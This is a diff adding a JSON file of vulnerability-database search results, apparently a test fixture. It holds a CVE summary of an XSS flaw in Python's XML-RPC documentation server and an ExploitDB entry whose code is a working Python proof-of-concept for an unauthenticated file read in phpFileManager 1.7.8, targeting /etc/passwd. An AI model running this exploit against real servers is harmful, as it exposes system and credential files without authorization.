@@ -1,0 +1,28 @@
+{
+    "matches": [
+        {
+            "source": "CVE",
+            "_id": "2019-16935",
+            "description": "The documentation XML-RPC server in Python through 2.7.16, 3.x through 3.6.9, and 3.7.x through 3.7.4 has XSS via the server_title field. This occurs in Lib/DocXMLRPCServer.py in Python 2.x, and in Lib/xmlrpc/server.py in Python 3.x. If set_server_title is called with untrusted input, arbitrary JavaScript can be delivered to clients that visit the http URL for this server.",
+            "osvdb": [],
+            "bid": [],
+            "cve": [
+                "CVE-2019-16935"
+            ],
+            "msb": []
+        },
+        {
+            "code": "# Exploit Title: phpFileManager 1.7.8 - Local File Inclusion\r\n# Date: 01.04.2019\r\n# Exploit Author: Murat Kalafatoglu\r\n# Vendor Homepage: https://sourceforge.net/projects/phpfm/\r\n# Software Demo: https://phpfm-demo.000webhostapp.com/\r\n# Version: v1.7.8\r\n# Category: Webapps\r\n# Tested on: XAMPP for Linux\r\n# Description: Any user can read files from the server\r\n# without authentication due to an existing LFI in the following path:\r\n# http://target/index.php?action=3&fm_current_dir=%2Fetc%2F&filename=passwd\r\n\r\n# PoC\r\n\r\n#!/usr/bin/python\r\n\r\nimport requests, sys\r\n\r\nprint \"\\n[*] phpFileManager 1.7.8 LFI PoC By Murat Kalafatoglu\"\r\nprint \"[+] usage: python \" + __file__ + \" http://<target_ip/domain>\"\r\nif (len(sys.argv) != 2):\r\n    print \"[*] Usage: poc.py <target_ip/domain>\"\r\n    exit(0)\r\nip_add = sys.argv[1]\r\n\r\ndr = raw_input('[+] Directory: aka /etc/\\n')\r\nfd = raw_input('[+] File : aka passwd\\n')\r\n\r\nprint \"Exploiting.....\"\r\nprint '\\n'\r\n\r\nexp = requests.get(\"\"+ ip_add + \"index.php?action=3&fm_current_dir=\" + dr + \"&filename=\" + fd +\"\")\r\nprint exp.text",
+            "description": "phpFileManager 1.7.8 - Local File Inclusion",
+            "author": "Murat Kalafatoglu",
+            "_id": 46638,
+            "source": "ExploitDB",
+            "platform": "php",
+            "date": "2019-04-02T00:00:00+00:00",
+            "cve": [],
+            "type": "webapps",
+            "port": 0
+        }
+    ],
+    "total": 1368
+}
